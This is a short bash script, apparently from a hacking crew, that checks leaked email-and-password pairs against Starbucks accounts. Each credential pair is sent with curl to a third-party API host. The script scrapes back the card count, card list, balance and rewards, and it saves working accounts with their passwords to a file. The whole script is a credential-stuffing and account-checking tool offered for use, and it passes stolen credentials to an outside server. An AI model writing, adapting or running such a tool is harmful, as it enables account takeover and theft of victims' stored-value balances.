#!/bin/bash
#Coded by Mr.DreamX69 - 3xcr3w
#Coded with love <3

GREEN='\e[38;5;82m'
CYAN='\e[38;5;45m'
RED='\e[38;5;196m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

login(){
	empass=$1
	mail=$(printf "$empass" | awk -F '|' '{print $1}')
	pass=$(printf "$empass" | awk -F '|' '{print $2}')
	ngecurl=$(curl -s "https://tool-sipekk.c9users.io/starbuck/api.php?mail=${mail}&pass=${pass}")
	total=$(echo "$ngecurl" | grep -Po '(?<=SbuxCard\(<font color=lime>)[^ Cards]*')
	cardlist=$(echo "$ngecurl" | grep -Po '(?<=\[<font color=lime>)[^\]]*' | sed 's:<[^>]*>::g')
	balance=$(echo "$ngecurl" | grep -Po '(?<=Ballance = <font color=green>)[^</]*')
	progress=$(echo "$ngecurl" | grep -Po '(?<=Progress : )[^ Reward]*')
	reward=$(echo "$ngecurl" | grep -Po '(?<=Reward : <font color=red>)[^</]*')
	if [[ $ngecurl =~ "Live" ]]; then
		echo -e "[${GREEN}LIVE${NC}]-[${GREEN}$mail${NC}]-[${GREEN}$total Cards${NC}]-[${GREEN}$cardlist${NC}]-[${GREEN}$balance Balance${NC}]-[${GREEN}$progress Progress${NC}]-[${GREEN}$reward Rewards${NC}]"
		echo "Live | $mail | $pass | $total Cards | $cardlist | $balance Balance | $progress Progress | $reward Rewards" >> live.txt
	else
		echo -e "[${RED}DIE${NC}]"
	fi
}

echo " Delimeter List | "
read -p 'List mu cok : ' list

count=1
jumlah=$(cat $list | wc -l)
for mailpass in $(cat $list)
do
	echo -ne "[$count/$jumlah] $mailpass "; login $mailpass
	((count++))
done
